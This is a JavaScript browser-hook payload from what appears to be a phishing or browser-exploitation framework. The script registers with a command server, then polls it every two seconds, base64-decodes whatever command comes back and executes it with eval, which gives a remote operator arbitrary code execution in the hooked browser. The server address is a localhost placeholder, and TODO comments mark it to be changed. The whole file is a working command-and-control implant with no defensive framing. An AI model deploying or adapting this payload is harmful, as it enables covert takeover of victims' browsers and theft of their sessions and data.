/*
Default payload for hooking browsers to the fisherman's boat using fetch api
This payload if for non-persistent scripts that after eval'd can be thrown away
*/


(async function() {
    var serverAddress = "127.0.0.1:5000";
    var connectionRetryCount = 0;

    async function sleep(time) {
        return new Promise((resolve) => setTimeout(resolve, time));
    }

    async function startSession(serverAddress) {
        for (let nConnectionAttemps = 0; nConnectionAttemps < 4; nConnectionAttemps++) {
            console.log("Hooking to server... ");
            try {
                const res = await fetch(`http://${serverAddress}/hook`, { // TODO: change from local host
                    method: "POST",
                    mode: 'cors', // Change to 'cors' to handle the response properly
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
    
                if (!res.ok) {
                    throw new Error(`HTTP error! status: ${res.status}`);
                }
    
                let data = await res.json();
                if (!data.message) {
                    throw new Error("Message field is empty in response. ");
                }

                return true;
    
            } 
            catch (error) {
                console.error(`Error hooking to server: ${error}, number of connection attempts: ${nConnectionAttemps}... `);
            }

            await sleep(2000);
        }
        
        return false;
    }

    async function sendRequest(serverAddress) {
        console.log("Fetching command from server...");
        try {
            const res = await fetch(`http://${serverAddress}/command`, { // TODO: change from local host
                method: "POST",
                mode: 'cors', // Change to 'cors' to handle the response properly
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: "same-origin"
            });

            if (!res.ok) {
                throw new Error(`HTTP error! status: ${res.status}`);
            }

            let data = await res.json();
            if (!data.command) {
                console.log("No command to execute... ");
            }

            else {
                eval(atob(data.command));
            }

            return true;

        } catch (error) {
            connectionRetryCount++;
            console.error(`Error fetching command from server: ${error}, number of connection attempts: ${connectionRetryCount}... `);
            if (connectionRetryCount > 3) {
                return false;
            }

            return true;
        }
    }

    const sessionStartStatus = await startSession(serverAddress);

    if (!sessionStartStatus) {
        throw new Error("Stopping execution due to connection problems... "); // TODO: Think if to clean up script from page
    }

    const intervalId = setInterval(() => { 
        const status = sendRequest(serverAddress);
        if (!status) {
            clearInterval(intervalId);
            throw new Error("Stopping execution due to connection problems... "); // TODO: Think if to clean up script from page
        }

    }, 2000);
})();